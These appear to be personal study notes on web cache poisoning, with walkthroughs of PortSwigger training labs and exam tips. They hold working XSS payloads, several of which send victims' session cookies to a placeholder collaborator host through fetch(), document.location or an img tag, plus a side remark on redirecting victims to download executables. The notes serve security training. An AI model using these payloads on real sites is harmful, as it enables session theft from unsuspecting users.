## Stage 1 + 2
### What is it?
Exploitation of web server behavior and cache so that a harmful HTTP response is served to victims. Involves 2 phases:
1. Attacker must work out how to elicit a response from the  server that contains a dangerous payload
2. Ensure the response is cached and can be served to victims

Web caching prevents server overload by serving clients cached instances of their webpage. Users will receive the cached response instead of reaching all the way to the backend server. This could lead to XSS, JavaScript injection, open redirection, etc. 
#### Cache Keys
When the cache receives an HTTP request from a client, it has to check if there is a cached response to send back. Caches identify requests by comparing the request's components aka cache keys. If the cache key of an incoming request matches a previous request's key, then it will send a copy of the cached response. Caches do expire (`Cache-Control: max-age`).
A cache key can be a combination of multiple request headers like `Host` + `User-Agent` + `Content-Length`. 
#### Exploitation
An attacker will send a malicious HTTP request to the cache, then victims will reach out to the cache (receiving the malicious payload) and we have web cache poisoning.

#### Cache Oracle
Components in the response that tells us if web cache poisoning is possible. Notable they are: `Cache-Control`, `Age`, and `X-Cache` for example. If you see this in HTTP responses, chances are that you can manipulate the request in hopes to exploit web cache poisoning.
If you see the response headers above on an endpoint, then that endpoint is a **cache oracle**.
![Web Cache Poisoning-20260120204413776](Web%20Cache%20Poisoning-20260120204413776.png)

### Extensions for Automated Testing
- Param Miner

[Recommendations](https://portswigger.net/web-security/web-cache-poisoning#how-to-prevent-web-cache-poisoning-vulnerabilities)

### Identify Vulnerabilities in Exam
- If `tracking.js` doesn't have `X-Cache` header then no web cache poisoning.
- Look for `/resources/js/tracking.js` + `X-Cache` header
- Might have to send way more than one request to poisoning the cache 

- <sup>Param Miner: Guess headers</sup> `X-Forwarded-Host` value reflected in response
	- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.1.%20Lab%20Web%20cache%20poisoning%20with%20an%20unkeyed%20header%20%E2%AD%95%EF%B8%8F)
Use the payload below in exploit server to send victim cookie to burp collaborator (can also send it to exploit server)
```
document.location='https://OASTIFY.COM/?cookies='+document.cookie;

document.write('<img src="https://OASTIFY.COM?cookies='+document.cookie+'" />')
```

- <sup>Param Miner: Guess headers</sup> `X-Forwarded-Host` + `X-Forwarded-Scheme`
	- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.3.%20Lab%20Web%20cache%20poisoning%20with%20multiple%20headers%20%E2%AD%95%EF%B8%8F)
- `fehost` cookie reflected in response
	- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.2.%20Lab%20Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie%20%E2%AD%95%EF%B8%8F)
Use this payload in the exploit server and deliver to victim to get their session cookie
```
fetch(`https://OASTIFY.COM/cookies=`+document.cookie);
```

^70fsx6

Use this payload to send victim cookie to burp collaborator *notice key characters inside `-` are url encoded*
```
fehost=someString"-fetch(`https%3a//OASTIFY.COM/x`%2bdocument.cookie)-"someString
```

- 2nd `Host` header reflected in response
	- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.x.%20Lab%20Web%20cache%20poisoning%20via%20ambiguous%20requests%20%E2%AD%95%EF%B8%8F%0A-%20%22HTML%20is%20allowed%22%20in%20Blog%20%2B%20%60x-host%60%0A%09%09-%20%3Csup%3EParam%20Miner%3A%20Guess%20headers%3C%2Fsup%3E%20%5B%5BWeb%20Cache%20Poisoning%231.4.Lab%20Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header%20%E2%AD%95%EF%B8%8F)

[Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.5.Lab%20Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string%20%E2%AD%95%EF%B8%8F)
- Use the payload below to confirm if alert gets reflected in response and says cache miss.
```
/?search=kek'/><script>alert(1)</script>
origin: example.com
```
- Use the payload below to poison the cache and will get the victim's session cookie when they visit the poisoned webpage *may need to url encode key chars*
```
kek'/><script>fetch(`https://OASTIFY.COM/x`+document.cookie);</script>
```

[Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.6.Lab%20Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter%20%E2%AD%95%EF%B8%8F)
- If the payload below breaks out and alert(1) fires, then vulnerable
```
/?utm_content=123'/><script>alert(1)</script>
```
- Payload to get victim session cookie *url encode key chars if doesn't work*
```
/?utm_content=123'/><script>document.location="https://OASTIFY.COM?c="+document.cookie</script>`
```

`/js/geolocate.js`
- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.7.Lab%20Parameter%20cloaking%20%E2%AD%95%EF%B8%8F)
	- Param Miner > Guess query params > Parameter Cloaking
```
/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```
--
	- Use the payload here: [Web Cache Poisoning](Web%20Cache%20Poisoning.md#%5E70fsx6) 
	- *URL encode key chars when using payloads in URL!*

- `/js/geolocate.js?callback=setCountryCookie`
	- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.8.%20Lab%20Web%20cache%20poisoning%20via%20a%20fat%20GET%20request%20%E2%AD%95%EF%B8%8F)
	- Set `callback=alert(1)` in the GET request body
	- Just use the `fetch()` payload -- no need to URL encode.

If gets reflected then vulnerable
[Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.9.%20Lab%20URL%20normalization%20%E2%AD%95%EF%B8%8F)
```
GET /random"><script>alert(1)</script>
```
- Use URL encoded `fetch()` payload



- - - 
#### 1.1. Lab: Web cache poisoning with an unkeyed header ⭕️
This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.
##### What is an unkeyed input/header?
Input/Header that is not apart of the cache key. So the malicious request utilizing the vulnerable input/header will be treated as a legitimate request. So victims visiting the host will be served the malicious cached request.
1. Add the `X-Forwarded-Host` header and the domain dynamically generated an absolute URL for importing an JS file `tracking.js`.  
**This can be the test case to see if an app is susceptible to web cache poisoning.**
![Web Cache Poisoning-20251016220201937](Web%20Cache%20Poisoning-20251016220201937.png)
>[!tip] Use Param Miner in a Real World Test
>Use the extension to automate and help to find which header is vulnerable to this.
>![Web Cache Poisoning-20251016223008791](Web%20Cache%20Poisoning-20251016223008791.png)
>In the Attack Config, click OK.
>Go to Target > Site map > select the in-scope domain > look at Issues. If vulnerable, Cache poisoning will show up and show which header is vulnerable.
>![309](Web%20Cache%20Poisoning-20251016223325953.png)

2. Send the request again a few times and notice the `X-Cache` response header says *hit* when it used to say *miss*. That means the latest request came from cache.
![Web Cache Poisoning-20251016220639462](Web%20Cache%20Poisoning-20251016220639462.png)
![Web Cache Poisoning-20251016220622825](Web%20Cache%20Poisoning-20251016220622825.png)

3. In the exploit server, set the following: 
```
document.location='https://OASTIFY.COM/?cookies='+document.cookie;
```
![503](Web%20Cache%20Poisoning-20251016221117225.png)
>[!info] Need to Figure Out the Correct Payload
>This payload should grab the victim's session cookie and we can retrieve it from the Access Log. But it didn't work. Need to figure this out and revisit this lab for the exam.
>Check the [YouTube videos](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)for help. And [this one](https://youtu.be/eNmF8fq-ur8). 

4. Go to the homepage `/` and paste the exploit server URL in the `X-Forwarded-Host` header and send requests until we see `X-Cache: hit` and the absolute path show our exploit server. 
	1. If it sends the cache version of the previous `X-Forwarded-Host` header (whatever.com) then add `?abc=123` to the URL and it should get a fresh response from the server.
![Web Cache Poisoning-20251016221402851](Web%20Cache%20Poisoning-20251016221402851.png)

5. Visit the homepage and the JS will execute and solved.
- - -
#### 1.2. Lab: Web cache poisoning with an unkeyed cookie ⭕️
This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(1)` in the visitor's browser.
1. Once we have the initial `GET /` request, refresh the page to get another `GET /` request. Notice we have a `fehost=prod-cache-01` cookie and the **value is reflected in the response inside a JS object**.
	1. ![Web Cache Poisoning-20260120161526855](Web%20Cache%20Poisoning-20260120161526855.png)
2. Send the `GET /` request to Repeater and add a cache buster like `GET /?c=1`.
	1. ![Web Cache Poisoning-20260120161630515](Web%20Cache%20Poisoning-20260120161630515.png)
3. Change the `fehost` cooke in the request to any arbitrary value and notice the user input is reflected in the response.
	1. ![Web Cache Poisoning-20260120161740006](Web%20Cache%20Poisoning-20260120161740006.png)
4. Enter the following payload `someString"-alert(1)-"someString`, Send it a few times til you see `X-Cache: hit` (*now the webpage is poisoned*), in your lab browser append `?c=1` and you should see an alert.
	1. ![Web Cache Poisoning-20260120161942374](Web%20Cache%20Poisoning-20260120161942374.png)
	2. ![Web Cache Poisoning-20260120161917919](Web%20Cache%20Poisoning-20260120161917919.png)
5. Repeater > remove `?c=1` > Send a few times til `X-Cache: hit` > lab browser remove `?c=1` and you should see an alert and then the lab is solved
	1. ![Web Cache Poisoning-20260120162226938](Web%20Cache%20Poisoning-20260120162226938.png)

>Used Param Miner > Guess everything, Guess headers, nor Guess cookies options but it didn't discover that the `fehost` cookie was vulnerable.

>[!tip] How to Identify this Vulnerability?
>1. `X-Cache` and `Cache-Control` response headers exists
>2. `fehost` cookie and the value is reflected in a JS object in the response
>3. User input via a request cookie (`fehost`) is reflected in the response

---
#### 1.3. Lab: Web cache poisoning with multiple headers ⭕️
This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.
Hint: This lab supports both the `X-Forwarded-Host` and `X-Forwarded-Scheme` headers.

1. Identify that we might be able to exploit web cache poisoning with these headers. Then add a cache buster to the URL `cb=123`.
![Web Cache Poisoning-20251026111654738](Web%20Cache%20Poisoning-20251026111654738.png)

2. Using Param Miner to find the vulnerable header(s).
![Web Cache Poisoning-20251026112451343](Web%20Cache%20Poisoning-20251026112451343.png)
![253](Web%20Cache%20Poisoning-20251027202400996.png)

3. If we put `https` for the `X-Forwarded-Scheme` header we get a 200 OK but if we put anything but `https`, we get a 302 found.
![520](Web%20Cache%20Poisoning-20251027202835944.png)
![523](Web%20Cache%20Poisoning-20251027202820248.png)

4. Repeat Step 2 to find the other vulnerable header using the request on Step 3 (remember to change the cache buster). The scan found `X-Forward-Host` is vulnerable.
![306](Web%20Cache%20Poisoning-20251027203925947.png)

5. Add the `X-Forwarded-Host` header and set it to an arbitrary domain, change the cache buster, then Send. Now the `Location` header will show our arbitrary domain meaning this will cause a redirect to this new domain due to the 302 Found response.
![495](Web%20Cache%20Poisoning-20251027203144846.png)

6. *Used example.com instead in this example* -- If you copy the URL and paste it in the browser, it should redirect you to the new arbitrary domain.
![477](Web%20Cache%20Poisoning-20251027204450723.png)
![485](Web%20Cache%20Poisoning-20251027204455329.png)
>[!tip] Real World Pentest
>Can use this method to redirect victims to a malicious webpage or auto download an executable. #Useful

7. In the exploit server, set these in the text fields. **But in the exam, we need a payload that would retrieve the victim's session cookie**.
![231](Web%20Cache%20Poisoning-20251027205302705.png)

8. Send the `/tracking.js` file to Repeater, set `X-Forwarded-Scheme` to anything but `https` so do `http123`, `X-Forwarded-Host` to the exploit server domain, send it til `X-Cache: hit`. Refresh the lab page and the alert box should show and solved. If it doesn't solve, click send a few more times and refresh.
![Web Cache Poisoning-20251027205228830](Web%20Cache%20Poisoning-20251027205228830.png)
![255](Web%20Cache%20Poisoning-20251027205152368.png)

---
#### 1.4.Lab: Targeted web cache poisoning using an unknown header ⭕️
This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.
1. Right click on `GET /` request > Extensions > Param Miner > Guess headers. **Got a result: `x-host` header**.
	1. ![264](Web%20Cache%20Poisoning-20260120163551930.png)
	2. ![Web Cache Poisoning-20260120163609486](Web%20Cache%20Poisoning-20260120163609486.png)
2. Send `GET /` to Repeater and add a cache buster like `?c=1` and add `X-Host: example.com`. Notice `example.com` is reflected in the response that's used to generate an absolute URL to load the `/resources/js/tracking.js` file.
	1. ![Web Cache Poisoning-20260120164018728](Web%20Cache%20Poisoning-20260120164018728.png)
3. Go to Exploit server > set `File: /resources/js/tracking.js` > set `Body: alert(document.cookie)`. Store. 
	1. ![155](Web%20Cache%20Poisoning-20260120164356662.png)
	2. ![Web Cache Poisoning-20260120164435830](Web%20Cache%20Poisoning-20260120164435830.png)
4. Set the `X-Host` header to your exploit server domain (remove the `https://`)  > Send til you see `X-Cache: hit`. *I changed c=1 to c=2 because c=1 was already cached.*
	1. ![Web Cache Poisoning-20260120165524471](Web%20Cache%20Poisoning-20260120165524471.png)
5. Testing the exploit on yourself:
	1. Browser > append `?c=2` or whatever your cache buster is and you should see an alert box. **That indicate that we successfully exploited web cache poisoning**.
6. Notice the `Vary: User-Agent` response header. It is a part of the cache key and **to target our victim, we need to find their User-Agent**.
	1. ![Web Cache Poisoning-20260120165753501](Web%20Cache%20Poisoning-20260120165753501.png)
	2.  To determine if the `User-Agent` header is part of the cache key: once you have a cache hit, *modify the User-Agent value and if you see a cache miss, it means User-Agent is a part of the cache key*. If you don't and see cache hit instead, then it is not part of the cache key. In this case, it is.
7. Enter the payload below and submit it as a comment. When a user visits that blog post, we will get a hit in the Access log.
	1. ![Web Cache Poisoning-20260120170013516](Web%20Cache%20Poisoning-20260120170013516.png)
```
<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
```
8. Exploit server > Access log > notice the `(Victim)` in the `/foo` entries. **We have the victim's User Agent**.
	1. ![Web Cache Poisoning-20260120170223413](Web%20Cache%20Poisoning-20260120170223413.png)
9. Repeater > replace your User-Agent with the victim's > Send til you get a cache hit > wait a moment and the lab will be solved.
	1. ![Web Cache Poisoning-20260120171139355](Web%20Cache%20Poisoning-20260120171139355.png)
>[!tip] How to Identify this Vulnerability?
>1. `X-Cache` and `Cache-Control` response headers exists
>2. Param Miner is able to identify a vulnerable hidden header
>3. Value of vulnerable header `example.com` is reflected in the response used to generate an URL to load a file
>4. `Vary: User-Agent` response header exists and it is part of the cache key
>5. User input feature accepts HTML tags like blog post comments

---
#### 1.5.Lab: Web cache poisoning via an unkeyed query string ⭕️
This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.
To solve the lab, poison the home page with a response that executes `alert(1)` in the victim's browser.
1. Send `GET /` to Repeater and send it til you see `X-Cache: hit`. Now try to add a cache buster like `/?c=2`, Send, and notice it still says `hit` instead of `miss`. This means the query string is an *unkeyed* input and is NOT part of the cache key.
	1. ![Web Cache Poisoning-20260120204838714](Web%20Cache%20Poisoning-20260120204838714.png)
2. Wait for the cache to expire (~like 35 seconds due to `max-age`) OR keep sending til you get a cache miss > send request with `/?c=2` again and notice that `c=2` is reflected in the response.
	1. ![Web Cache Poisoning-20260120205423156](Web%20Cache%20Poisoning-20260120205423156.png)
3. Find a cache buster:
	1. **Cookie header**: Make sure to send the request til you see `X-Cache: hit` then try adding a `Cookie` header. Still get a cache hit meaning we cannot use `Cookie` as a cache key. *My lab gave me a cache miss when I added the cookie header. idk anymore.*
		1. ![Web Cache Poisoning-20260120205733472](Web%20Cache%20Poisoning-20260120205733472.png)
	2. **Accept header**: add `,text/c=222` to the `Accept` header and Send. Still says cache hit. Can't use this as a cache buster.
		1. ![Web Cache Poisoning-20260120211811210](Web%20Cache%20Poisoning-20260120211811210.png)
	3. **Accept-Encoding header**: add `, cb=222` to the `Accept-Encoding` header. Says cache hit, not a cache key.
		1. ![Web Cache Poisoning-20260120211926864](Web%20Cache%20Poisoning-20260120211926864.png)
	4. **Origin header**: add an `origin` header and this time we get a *cache miss*! We can use this as our cache buster. To confirm this, send the request a few times til you get a cache hit, change the value to something like `example222.com` and should get a cache miss.
		1. ![Web Cache Poisoning-20260120212035623](Web%20Cache%20Poisoning-20260120212035623.png)
		2. ![Web Cache Poisoning-20260120212140442](Web%20Cache%20Poisoning-20260120212140442.png)
		3. ![Web Cache Poisoning-20260120212200766](Web%20Cache%20Poisoning-20260120212200766.png)
4. Testing exploit on ourselves:
	1. Use the payload below in the query string until we get a cache hit.
	2. Right click > request in browser > in original session and notice we get an alert popup!
		1. ![280](Web%20Cache%20Poisoning-20260120212500637.png)
```
GET /?evil='/><script>alert(1)</script>
```
5. Poison `GET /`:
	1. Remove the `Origin` header entirely, send requests til cache hit, and lab solved.

>Param Miner could not find anything to identify vulnerable components.

>[!tip] How to Identify this Vulnerability?
>1. `X-Cache` and `Cache-Control` response headers exists
>2. Query string is unkeyed (can't use `/?c=2` as a cache buster) AND it is reflected in the response

---
#### 1.6.Lab: Web cache poisoning via an unkeyed query parameter ⭕️
This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome.
To solve the lab, poison the cache with a response that executes `alert(1)` in the victim's browser.
Hint: Websites often exclude certain **UTM analytics** parameters from the cache key.

1. Add a random query string like `test=1`, then send a few times you will see `X-Cache` change from miss to hit. Change it to `test=2` and it changed to miss again. This is how we know that query parameters are apart of the cache key. Query string is also reflected in the response (not required).
**This is how you know an endpoint might be vulnerable to web cache poisoning(?)**
 ![659](Web%20Cache%20Poisoning-20251021210657019.png)

2. Used Param Miner's guess query params and this also confirms that query parameters **excludes** certain query parameters from the cache key. Meaning that is our way into web cache poisoning. **Excludes means it will cache the request so victims could retrieve it.**
![329](Web%20Cache%20Poisoning-20251021205837868.png)
3. The Hint said something about utm analytics so googling that will give us some parameters to try. The goal is trying to find which one will keep saying `X-Cache: hit` even if you change the value of the query string.
![356](Web%20Cache%20Poisoning-20251021210333425.png)

4. For example, we know `utm_medium` is not vulnerable because we have `111`, send it a few times and we get a `hit` but then changing it to `112` will get us a `miss`. So this query parameter is apart of the cache key aka **keyed**. We're looking for a query param that is **unkeyed** so no matter what value we put in, `X-Cache` should continue to say `hit`.
![359](Web%20Cache%20Poisoning-20251021210218507.png)
![361](Web%20Cache%20Poisoning-20251021210156767.png)

5. `utm_content` will also show `X-Cache: hit` no matter what value we give it. So this query parameter is **unkeyed** aka vulnerable to web cache poisoning. 
>[!tip] utm_content is Often Unkeyed
>Apparently, this query parameter is often found to be unkeyed so might be a good idea to try this on real world tests. Source: Community solution on YouTube.

6. Try to break out of the `<link>` tag with this `/?utm_content='/><script>alert(1)</script>` and we see in the response that we were successful injecting an XSS payload.
![Web Cache Poisoning-20251021212559610](Web%20Cache%20Poisoning-20251021212559610.png)

7. To confirm XSS, right click > Copy URL then paste in the browser. In a real-world exploit, click Send til we see `X-Cache: hit` then when victims visit this URL, XSS will execute.
![360](Web%20Cache%20Poisoning-20251021212730865.png)
>[!tip] Payload  
>The payload below will send the victim's session cookie to your collaborator server (need to put your link in there). Or at least it should.
>`GET /?utm_content='/><script>document.location="https://OASTIFY.COM?c="+document.cookie</script>` 

- - -
#### 1.7.Lab: Parameter cloaking ⭕️
This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome.
To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes `alert(1)` in the victim's browser.
Hint: The website excludes a certain UTM analytics parameter.

1. Two ways to identify the vulnerable component: manually or automated with Param Miner.
##### Manual
Try `utm_content` again the just add something like `111`. Click Send til it has `hit`. Then add a semicolon `;` and add another parameter `test123` in this screenshot. Clicking Send will still give us a `X-Cache: hit`. **That means the app treats this entire query string as one parameter. We can then use this to call functions or whatever.** 
![Web Cache Poisoning-20251021215146611](Web%20Cache%20Poisoning-20251021215146611.png)
##### Automated
Send a request to Repeater > right click > Extensions > Param Miner > Guess query params. We will see a callout to Parameter Cloaking; notice the semicolon here.
![Web Cache Poisoning-20251022212919821](Web%20Cache%20Poisoning-20251022212919821.png)

This Param Miner option (rails param cloaking scan) can also find the vulnerability.
![Web Cache Poisoning-20251022213044584](Web%20Cache%20Poisoning-20251022213044584.png)

Another way to check which parameter is vulnerable after running Param Miner: Extensions > Installed > Param Miner > Output.
![615](Web%20Cache%20Poisoning-20251022215658599.png)

>[!info] Cache Buster Alternative
>We don't always have to use the query parameters as cache busters to test for this vulnerability. Can also use other headers like `Origin`. Check the community solution YouTube video. Put `Origin: www.test.com`, Send until we see `X-Cache: hit`, then change to `Origin: 123.test.com` and if we see `miss` then we know this is keyed and can use this a cache buster.
>Other headers that might work are Cookie, Accept, Accept-Encoding, etc.

2. Every request imports the `geolocate.js` file. If you don't see it, make sure `js` are not hidden (uncheck the Hide box). **This is important because since this JS file is called on every request, it means if we poison this request, victims will be affected without fail.**
 ![678](Web%20Cache%20Poisoning-20251022213417112.png)

3. We can edit the `callback` value by adding `1` but we see a `miss` and that means this parameter is keyed. We need it to be **unkeyed** to take advantage of this. We want the `X-Cache` to say `hit` no matter what we put there.
![502](Web%20Cache%20Poisoning-20251022213652482.png)
![494](Web%20Cache%20Poisoning-20251022213714694.png)

4. **Add a duplicate callback parameter** `&callback=hello123` and we can see only the final callback parameter gets reflected in the response. `setCountryCookie` was not reflected; it used to before we added `hello123`. This is called *parameter pollution*.
![517](Web%20Cache%20Poisoning-20251022214048469.png)

 5. Pop this `&utm_content=hey;callback=alert(1)` into the URL and solved. If we change `alert(1)` to `alert(2)`, `X-Cache` should still say hit which shows that our parameter cloaking technique is successful and that `utm_content` is indeed **unkeyed**. 
![Web Cache Poisoning-20251022214611669](Web%20Cache%20Poisoning-20251022214611669.png)
- - -
#### 1.x. Lab: Web cache poisoning via ambiguous requests ⭕️
This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page.
To solve the lab, poison the cache so the home page executes `alert(document.cookie)` in the victim's browser.

1. Modifying the host header will yield a 403 code meaning the app validates the `Host` header.
![484](Web%20Cache%20Poisoning-20251022221020781.png)
If your request have a session cookie you'd get a 504.
![477](Web%20Cache%20Poisoning%20%E2%9C%85-20260204210850786.png)

2. Add a cache buster `cb=123`, Send it, then add a **second Host header**, change the cache buster, then Send it again. We still get a 200 OK and the second host header is reflected in the response. *Reflected in the response is required for XSS and the lab is using web cache poisoning as a gateway towards XSS.*
![556](Web%20Cache%20Poisoning-20251026104958256.png)

3. Send the request again without changing until `X-Cache: hit`, then remove the second host header and send it once more. See that the response still says `whatever.com` for the `tracking.js` file even though the second host header was removed **meaning that potential vulnerable domain is cached. This is the way into exploiting this vulnerability.**
![558](Web%20Cache%20Poisoning-20251026105454631.png)

4. Follow the screenshot for the exploit server. **But in a real world scenario, might want to do more like try to exfiltrate the cookie (for the exam) or try to download an executable or redirect to a webpage in a pentest.**
![298](Web%20Cache%20Poisoning-20251026110025387.png)

5. To solve the lab, **remove the cache buster** to just have `/` in the URL, send it til it shoes `X-Cache: hit`. This is important because this is simulating an attacker storing a malicious payload in the `tracking.js` file which is called on every request so every victim that visits `/` will get infected.
- - -
#### 1.8. Lab: Web cache poisoning via a fat GET request ⭕️
This lab is vulnerable to web cache poisoning. It accepts `GET` requests that have a body, but does not include the body in the cache key. A user regularly visits this site's home page using Chrome.
To solve the lab, poison the cache with a response that executes `alert(1)` in the victim's browser.
>[!info] What is a "fat GET request"?
>It's an unusual or non-standard GET request. Which often refers to a GET request that contains request body parameter(s). GET requests normally don't have request bodies.

1. Instead of using the URL path parameter as a cache buster, you can try other headers such as `Origin`.
![485](Web%20Cache%20Poisoning-20251027211226537.png)

2. Add the function `callback` and set it to `alert(1)`, change the cache buster then Send. See that the `setCountryCookie` function in the response changed.
![453](Web%20Cache%20Poisoning-20251027211428228.png)

3. We know the `callback` function in the body is **unkeyed** because even when we remove the cache buster, `X-Cache` will still say `hit`. Remove the cache buster, Send, and solve. If it doesn't solve, change to `alert(2)`, Send or change it back to 1 then send again.

- - -
#### 1.9. Lab: URL normalization ⭕️
This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.
To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute `alert(1)` in the victim's browser. Then, deliver the malicious URL to the victim.
1. Send `GET /` to Repeater. Notice `Cache-Control`, `Age`, and `X-Cache` response headers and thus `/` is a *cache oracle*. Send requests til you see a `X-Cache: hit`. 
2. Identify cache buster:
	1. Add `?c=1` to the query string and send. Notice we get `X-Cache: miss` that means we can use the query string as a cache buster. If we change it to `c=2` we should get a cache miss again.
		1. ![Web Cache Poisoning-20260120213208098](Web%20Cache%20Poisoning-20260120213208098.png)
	2. Search `c=1` in the response and we got no results
		1. ![Web Cache Poisoning-20260120213353720](Web%20Cache%20Poisoning-20260120213353720.png)
3. Identify unkeyed inputs:
	1. Right click > Extensions > Param Miner > Guess everything!
	2. Got no results, so we can **move on to looking for Normalization behavior**.
SKIP (The above was from the community solution video -- i am confused).

To solve the lab:
1. Enter `/random` in the URL and get a 404 Not Found but notice `/random` is reflected. Send to Repeater.
	1. ![Web Cache Poisoning-20260120214126511](Web%20Cache%20Poisoning-20260120214126511.png)
2. Send the following payload:
	1. ![472](Web%20Cache%20Poisoning-20260120214242453.png)
```
/random</p><script>alert(1)</script><p>foo
```
3. Send the request til you see `X-Cache: hit`. Quickly right click > copy URL > Deliver exploit to victim and solve.
>[!tip] How to Identify this Vulnerability?
>1. `X-Cache` and `Cache-Control` response headers exists
>2. Cache buster in the query string like `/?c=1`
>3. Query string (`c=1`) is *not* reflected in the response
>4. Non-existent directory like `/random` *is* reflected in the response






